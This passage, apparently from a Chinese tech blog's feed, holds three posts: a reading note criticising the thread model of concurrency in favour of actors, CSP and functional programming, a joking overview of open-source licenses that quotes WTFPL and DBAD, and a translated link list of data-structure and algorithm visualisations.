<p>加州大学伯克利分校教授，<a href="http://ptolemy.eecs.berkeley.edu/~eal/" target="_blank">爱德华 A. 李</a>在2006年做了一次题为<a href="https://www.eecs.berkeley.edu/Pubs/TechRpts/2006/EECS-2006-1.html" target="_blank">《线程的麻烦 (The Problem with Threads)》</a>的学术报告。在报告中他提到：看上去，多线程只是对核心语言的小小扩展，甚至可以以第三方库的形式存在。但实质上，多线程程序和原有的核心语言编写的程序已经完全不同了。其原因在于，由于多线程程序可能以任意的次序交错执行，程序再也无法像顺序执行时那样产生确定的结果。多线程程序容易编写(因为写的是顺序程序)，但是难分析，难调试，更容易出错。</p>
<p>在我的想法中，产生问题的根源，是多线程模型作为对并发问题的一个抽象，是很不完善的。<span id="more-4626"></span>抽象的实质是对问题的转换。我们可以把抽象应用于一个问题，把它转换成另一个（或许）更简单的问题来解决。解决了转换后的简单问题，就意味着解决了原有的困难问题。严格来说，一个抽象一定要保存原有问题的结构，同时去除无关细节。但是，由于我们生活的世界并没有什么东西是完全“严格”的，现实中使用的抽象有时会隐藏解决问题的关键细节，或者残留一些不该漏出来的东西。评价一个抽象的好坏，也就不止是看它能节省多少代码，和它的界面有多优美这么简单，同时还要看看在一个问题被抽象转换之后，留了下来的细节还能不能好好地解决它。</p>
<p>我们可以从这个意义上理解为什么线程模型是个很糟糕的抽象。一方面，对解决问题很关键的细节（如执行次序）被隐藏起来并受到了粗暴的对待。另一方面，线程模型极力兼容顺序程序的设计思想也使得如共享变量这样的，与线程不兼容的细节依然残留在程序员们的视线之内。我们无力控制程序的执行次序，而我们程序的正确性却依赖于对共享变量的有序变更。可以说，线程提供给我们的抽象简直是千疮百孔。我们还能用它干活，只是因为我们手里还有加锁机制，而它可以部分地堵上线程模型的漏洞。讽刺的是，引入加锁机制解决问题的同时，又带来了新的问题，所以我们编写多线程程序总会遇上死锁，活锁，优先级反转……等等。</p>
<p>同样作为并发编程问题的抽象，<a href="http://c2.com/cgi/wiki?ActorsModel" target="_blank">角色模型</a>（Actor Model） 比线程模型好就好在，它的资源分享不像线程模型那样通过共享变量来进行。角色模型中的资源分享只能通过特定的机制（消息传递）来进行。你在角色模型里依然可能犯错误，如你可能制造死锁，也有可能造成优先级反转。但是没有共享变量就意味着没有了竞争条件，所以绝大部分资源也用不着上锁了。这样一来，原先至关重要的细节变得不那么重要，问题就这么解决了。</p>
<p>一般来说，在修复一个糟糕的抽象时，可以采取的策略分如下两类：</p>
<ul>
<li>把造成问题的那部分抽象拿掉，直接露出底层的细节</li>
<li>换一个和底层兼容性更好的抽象模型</li>
</ul>
<p>以 <a href="https://en.wikipedia.org/wiki/MapReduce" target="_blank">MapReduce </a>为例，它在解决分布式计算问题时，采取的是第一类策略。与现时流行的做法相反，MapReduce 并不试图制造计算是在单一场所完成的假象(流行话讲叫“云计算”)，相反它需要程序员自己把问题拆分到集群中不同的机器上。同时，它却隐藏了大量其他细节。这种另类策略导致批评 MapReduce “<a href="http://databasecolumn.vertica.com/database-innovation/mapreduce-a-major-step-backwards/" target="_blank">太底层，不通用</a>” 的声音不绝于耳， 然而这正是 MapReduce 聪明的地方。它放弃面面俱到，集中精力于高效地解决一小类问题（这类问题与排序问题有类似的结构），同时对其他的问题故意视而不见。它的流行证明了这一策略的成功。</p>
<p>角色模型，通信进程（<a href="https://en.wikipedia.org/wiki/Communicating_sequential_processes" target="_blank">Communicating Sequential Processes</a>, CSP），以及函数式编程（FP）在应对并发编程问题时不约而同地选择了第二类策略。它们采用了与并发兼容性更好的抽象。角色模型与通信进程从线程模型的问题中抹去了共享变量，纯粹 FP 则抹掉了“变量”的可变性。CSP 还可以降低程序执行次序的不确定性（因为在CSP中执行次序默认是确定的，不确定性必须在程序设计时显式声明）。由于这些努力，这几种模型都避免了落入线程模型的麻烦中，得到了对并发问题的更优美的解法。我们可以说，这些模型提供的抽象比线程模型的都要好。很遗憾的是，它们尽管优美，但却乏人问津。角色模型与通信进程目前不被任何主流操作系统原生支持（微软在 Windows 7 附带的新并行运行时 <a href="https://msdn.microsoft.com/en-us/library/dd504870.aspx" target="_blank">ConcRT </a>中加入了基于角色模型的 Asynchronous Agents Library，使得状况稍微改观了一点）。FP 的年岁几乎和计算机语言的历史一样古老， 但它的市场份额直到现在也小得可怜。</p>
<p>也许一切都是因为线程模型表面上那迷惑人的简单性，以及墨菲定律的变体：布劳尔技术惯性定律（已经成功的技术在新的，更好的技术出现时也会赖着不走）。我们曾经接纳了一个有缺点的解决方案，而现在我们被捆绑在这个方案上了。我们为线程模型写了成百上千万行的代码，而现在这些代码的重量束缚住我们的手脚，使得我们无法前行。</p>
<p>解决线程模型带来的问题的正确做法，是推广新的，更完善的模型。既然解决问题的阻碍同时来自于新技术的低认知度和现有代码的拖累，很自然地有两个方面的工作要做。一、使得新技术更容易被多数程序员使用，二、想办法让现有的代码和新技术兼容。</p>
<p>在兼容老代码这一头，我们已经有了一些行动。微软在 Windows 7 中提供一个称为<a href="https://msdn.microsoft.com/en-us/library/dd627187%28v=vs.85%29.aspx" target="_blank">用户模式调度 </a>(UMS) 的功能。UMS 可以将内核模式的线程转换为用户模式线程，而应用程序可以自己提供一个 UMS 调度器来调度它们。这意味着，我们现在有机会重载掉系统调度器的默认行为，而根据应用自身的特点给出更合理的调度安排来。这个功能可以用在构造更容易使用的并发模型上，这样开发的模型可以与老代码兼容（但 UMS 有一个让人迷惑的限制：只能用在64bit 的Windows 7 版本上）。</p>
<p>同样地，在推广新技术方面，现在也有了很多成果。除了角色模型外，事务性内存(这又是一种避免竞争条件，从而避免加锁的方法)正在研究中；CSP 已经有了数个实现（如由 Kent 大学开发，针对 Java 的 <a href="http://www.cs.kent.ac.uk/projects/ofa/jcsp/" target="_blank">JCSP</a>），同时还有针对 CSP 的模型检证工具；至于 FP，最近因为人们认为 Web 系统的建模可以在函数式编程范式中更好的表达，FP 正在唤起人们的注意。我们缺的只剩下新技术的成功应用范例（实际上，前面的技术并不是没有成功范例，我们缺的是经验能够大规模运用的范例 ），以及一支理解这些技术的程序员大军了。对于这后一条，我甚至想，既然多线程编程唯一”容易”的事情是写代码，何不做出一种工具来让程序员们可以用写顺序程序的思维来在这些新模型中编写程序呢？这样的工具会帮助程序员利用线性程序的思维来理解代码，但是同时又让人注意到自己的改动正在影响系统的哪一部分。如果新模型的代码变得好理解了，也许更多的人会使用它们。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17680.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_title">从Gitlab误删除数据库想到的</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17459.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_title">关于高可用的系统</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6775.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_title">Bret Victor – Inventing on Principle</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a>
</li>
</ul>
</div></div>
<div id="post-ratings-4626" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="d5c0b2348a">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>24</strong> 人打了分，平均分： <strong>4.04</strong> )<br><span class="post-ratings-text" id="ratings_4626_text"></span><meta itemprop="name" content="读书笔记：对线程模型的批评">
<meta itemprop="headline" content="读书笔记：对线程模型的批评">
<meta itemprop="description" content='——感谢Ian.Sian投递本文——

多线程模型是主流的并发编程模型。在过去几十年来，多线程模型一直是开发并发程序的有力工具。然而，它的历史并非总那么美好。1997年，NASA 的“火星探路者”号在执行任务的途中遭遇了严重的时序异常（参见 "What really happend on Mars"，注目 follow-up 中的现身说法），无法发回探测数据。如果不是 NASA 远程刷新了程序...'>
<meta itemprop="datePublished" content="2011-05-03T10:23:27+08:00">
<meta itemprop="dateModified" content="2011-05-03T10:23:27+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4626.html">
<meta itemprop="author" content="Ian.sino">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4626.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.04">
<meta itemprop="ratingCount" content="24">
</div>
</div>
<div id="post-ratings-4626-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-05-03T10:23:27+08:00</pubDate>
<guid>https://coolshell.cn/articles/4626.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 狗日的开源软件许可证 ]]></title>
<link>https://coolshell.cn/articles/4657.html</link>
<content><![CDATA[ 
<p>你知道这个世上有多少种开源软件的许可证吗？GPL，BSD，MIT，Apache？GNU上有个网页，上面<a href="https://www.gnu.org/licenses/license-list.html" target="_blank">记录了几乎所有的开源软件的许可证</a>，真TMD的多，有开源的，有商用的，有软件的，有文档的，多得你都不想看了，天杀的，程序员们还真能鼓捣啊。不过，主流的也就几种——<a href="https://www.gnu.org/licenses/gpl.html" target="_blank">GPL</a><a href="https://coolshell.cn/wp-content/uploads/2011/05/OSS-License.jpg"></a>、<a href="https://en.wikipedia.org/wiki/BSD_licenses">BSD</a>、<a href="https://en.wikipedia.org/wiki/MIT_License">MIT</a>、<a href="https://www.mozilla.org/MPL/">Mozilla</a>、<a href="https://www.apache.org/licenses/LICENSE-2.0">Apache</a>等等。</p>
<p>那么，你知道怎么区别他们吧？怎么选择他们吗？这里有一张比较复杂的图，在调侃这些纷繁的许可证（我不翻译了，这个图属于是发泄不满）</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2011/05/OSS-License.jpg"><img alt="image placeholder" ></a></p>
<p>下面是另一个图，这个图<a href="http://pbagwl.com/post/5078147450/description-of-popular-software-licenses" target="_blank">来自这里</a><a href="https://coolshell.cn/wp-content/uploads/2011/05/Infographic-of-popular-software-licenses.jpg"></a>，这个图并不恶搞，但其非常简单地说明了如何选择一个开源的许可证：</p>
<p><span id="more-4657"></span></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2011/05/Infographic-of-popular-software-licenses.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">最后，正如<a title="BT雷人的程序语言（大全）" href="https://coolshell.cn/articles/4458.html" target="_blank">那些BT雷人的程序语言</a>一样，我想介绍两个比较独特的开源软件许可证给你，以辉映本文的标题——</p>
<h4 style="text-align: left;">1、WTFPL</h4>
<p style="text-align: left;"><a href="http://sam.zoy.org/wtfpl/COPYING" target="_blank">WTFPL</a>全称 What The Fuck Public License，这个许可证单从名字上就那么NB了，其许可证如下，相当的短，完全的自由，你的开源软件有自信用这个许可证吗？</p>
<pre>            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
                    Version 2, December 2004

 Copyright (C) 2004 Sam Hocevar &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c6b5a7ab86aea9a5a3b0a7b4e8a8a3b2">[email protected]</a>&gt;

 Everyone is permitted to copy and distribute verbatim or modified
 copies of this license document, and changing it is allowed as long
 as the name is changed.

            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. You just DO WHAT THE FUCK YOU WANT TO.</pre>
<p style="text-align: left;">最后那句——You just DO WHAT THE FUCK YOU WANT TO 真是铿锵有力，怎么说怎么痛快，很有一种在看美国大片的感觉。这是我喜欢这个许可证的原因之一，即不限制你控制版权，也不限制你放弃版权！</p>
<h4 style="text-align: left;">2、DBAD</h4>
<p style="text-align: left;"><a href="https://github.com/SFEley/candy/blob/2f964916961a2dcccbb374cd389520ac2ac62226/LICENSE.markdown" target="_blank">DBAD</a>全称 Don’t Be A Dick，dick是什么我就不解释了，你自己查字典吧。这个许可证中定义了什么是dick，</p>
<blockquote>
<p style="text-align: left;">A person who <em>does not</em> respect the time and energy that have been invested in the Project, ……. A Dick is nearly always selfish, but not necessarily with deliberate intent; some Dicks are merely thoughtless. ……</p>
</blockquote>
<p style="text-align: left;">也就是项目中扯淡的人。这个许可证最NB的地方在于其不限制软件的版权，而是限制了软件开发中的人的行为。我真是太喜欢这个许可证了。（请参看其第四节Limitation ）</p>
<p style="text-align: left;">（全文完）</p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/3723.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3723.html" class="wp_rp_title">（麻省理工免费课程）计算机科学和编程导论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19996.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19996.html" class="wp_rp_title">Unix 50 年：Ken Thompson 的密码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17929.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17929.html" class="wp_rp_title">Go编程模式：修饰器</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17757.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17757.html" class="wp_rp_title">如何重构“箭头型”代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4657" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="5436c31495">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>15</strong> 人打了分，平均分： <strong>4.13</strong> )<br><span class="post-ratings-text" id="ratings_4657_text"></span><meta itemprop="name" content="狗日的开源软件许可证">
<meta itemprop="headline" content="狗日的开源软件许可证">
<meta itemprop="description" content="你知道这个世上有多少种开源软件的许可证吗？GPL，BSD，MIT，Apache？GNU上有个网页，上面记录了几乎所有的开源软件的许可证，真TMD的多，有开源的，有商用的，有软件的，有文档的，多得你都不想看了，天杀的，程序员们还真能鼓捣啊。不过，主流的也就几种——GPL、BSD、MIT、Mozilla、Apache等等。

那么，你知道怎么区别他们吧？怎么选择他们吗？这里有一张比较复杂的图，在调...">
<meta itemprop="datePublished" content="2011-05-04T08:25:17+08:00">
<meta itemprop="dateModified" content="2011-05-04T14:39:19+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4657.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4657.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.13">
<meta itemprop="ratingCount" content="15">
</div>
</div>
<div id="post-ratings-4657-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-05-04T08:25:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/4657.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 可视化的数据结构和算法 ]]></title>
<link>https://coolshell.cn/articles/4671.html</link>
<content><![CDATA[ 
<p>还记得之前发布过的那个<a title="可视化的排序过程" href="https://coolshell.cn/articles/3933.html" target="_blank">关于可视化排序</a>的文章吗？在网上又看到了一个旧金山大学<a href="http://www.cs.usfca.edu/galles">David Galles</a>做的各种可视化的数据结构和基本算法的主页，<a href="http://www.cs.usfca.edu/~galles/visualization/Algorithms.html" target="_blank">网址在这里</a>，大家可以看看。我把这个页面的目录列在下面并翻译了一下，大家可以直接点击了。</p>
<p>不知道国内的教育有没有相关的教学课件，至少在我大学的时候是没有的。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%9F%BA%E7%A1%80" title="基础">基础</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%B4%A2%E5%BC%95" title="索引">索引</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%8E%92%E5%BA%8F" title="排序">排序</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%A0%86%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84" title="堆数据结构">堆数据结构</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%9B%BE_%E7%AE%97%E6%B3%95" title="图 算法">图 算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B" title="动态编程">动态编程</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%85%B6%E5%AE%83%E2%80%A6" title="其它…">其它…</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E7%A1%80"></span>基础<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/StackArray.html">Stack栈: 数组实现</a></li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/StackLL.html">Stack栈: 链表实现</a></li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/QueueArray.html">Queues队列: 数组实现</a></li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/QueueLL.html">Queues队列: 链表实现</a></li>
<li>Lists列表: 数组实现 ( <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版演示)</li>
<li>Lists列表: 链表实现 ( <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版演示)</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%B4%A2%E5%BC%95"></span>索引<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BST.html">Binary Search Trees</a> 二叉检索树</li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/AVLTree.html">AVL Trees (平衡二叉检索树)</a></li>
<li>Red-Black Trees 红黑树 ( <a href="http://www.cs.usfca.edu/~galles/visualization/flash.html">flash</a> 版本演示)</li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/OpenHash.html">Open Hash Tables 开放哈希表(Closed Addressing 链地址法)</a></li>
<li><a href="http://www.cs.usfca.edu/~galles/visualization/ClosedHash.html">Closed Hash Tables  闭合哈希表 (Open Addressing 开放定址法)</a></li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/ClosedHashBucket.html">Closed Hash Tables, using buckets</a> 使用桶</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BTree.html">B Trees</a> B树</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BPlusTree.html">B+ Trees</a> B+树</li>
</ul>
<p><span id="more-4671"></span></p>
<p><a></a></p>
<p><a></a></p>
<li style="display: inline !important;">
<h4>
<span class="ez-toc-section" id="%E6%8E%92%E5%BA%8F"></span>排序<span class="ez-toc-section-end"></span>
</h4>
</li>
<p></p>
<ul>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html">Comparison Sorting</a> 比较式排序
<ul>
<li>Bubble Sort 冒泡排序</li>
<li>Selection Sort 选择排序</li>
<li>Insertion Sort 插入排序</li>
<li>Shell Sort 希尔排序</li>
<li>Merge Sort 归并排序</li>
<li>Quck Sort 快速排序</li>
</ul>
</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BucketSort.html">Bucket Sort</a> 桶排序</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/CountingSort.html">Counting Sort</a> 计数排序</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/RadixSort.html">Radix Sort</a> 基数排序</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%A0%86%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"></span>堆数据结构<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/Heap.html">Heaps</a> 堆</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BinomialQueue.html">Binomial Queues</a> 二项队列</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%9B%BE_%E7%AE%97%E6%B3%95"></span>图 算法<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/BFS.html">Breadth-First Search</a> 广度优先搜索</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/DFS.html">Depth-First Search</a> 深度优先搜索</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/ConnectedComponent.html">Connected Components</a> 连通性</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/Dijkstra.html">Dijkstra’s Shortest Path</a> Dijkstra最短路径</li>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/Prim.html">Prim’s Minimum Cost Spanning Tree</a> 最小生成树</li>
<li>Topological Sort  拓扑排序 ( <a href="http://www.cs.usfca.edu/~galles/visualization/flash.html">flash</a> 版本演示  <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版本演示)</li>
<li>Floyd-Warshall 算法(解决任意两点间的最短路径的一种算法) (<a href="http://www.cs.usfca.edu/~galles/visualization/flash.html">flash</a> 版本演示 <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版本演示)</li>
<li>基于<em>Kruskal</em>算法的最小生成树的构建 ( <a href="http://www.cs.usfca.edu/~galles/visualization/flash.html">flash</a> 版本演示 <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版本演示)</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B"></span>动态编程<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>计算 Fibonacci 数 ( <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版本演示)</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E2%80%A6"></span>其它…<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.cs.usfca.edu/~galles/visualization/DisjointSets.html">Disjoint Sets</a> （MIT算法公开课中有一课讨论的是这个，见<a href="http://v.163.com/movie/2010/12/V/E/M6UTT5U0I_M6V2UDUVE.html" target="_blank">网易公开课</a>）</li>
<li>Huffman Coding 哈夫曼编码 ( <a href="http://www.cs.usfca.edu/~galles/visualization/java/visualization.html">java</a> 版本演示)</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6010.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6010.html" class="wp_rp_title">一些有意思的算法代码</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3933.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3933.html" class="wp_rp_title">可视化的排序过程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2583.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2583.html" class="wp_rp_title">一些重要的算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/536.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/536.html" class="wp_rp_title">一个显示排序过程的Python脚本</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4671" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="7d50ac9d7a">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>24</strong> 人打了分，平均分： <strong>4.50</strong> )<br><span class="post-ratings-text" id="ratings_4671_text"></span><meta itemprop="name" content="可视化的数据结构和算法">
<meta itemprop="headline" content="可视化的数据结构和算法">
<meta itemprop="description" content="还记得之前发布过的那个关于可视化排序的文章吗？在网上又看到了一个旧金山大学David Galles做的各种可视化的数据结构和基本算法的主页，网址在这里，大家可以看看。我把这个页面的目录列在下面并翻译了一下，大家可以直接点击了。

不知道国内的教育有没有相关的教学课件，至少在我大学的时候是没有的。
基础

	Stack栈: 数组实现
	Stack栈: 链表实现
	Queues队列: 数...">
<meta itemprop="datePublished" content="2011-05-04T14:26:46+08:00">
<meta itemprop="dateModified" content="2011-05-04T14:26:46+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4671.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4671.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.5">
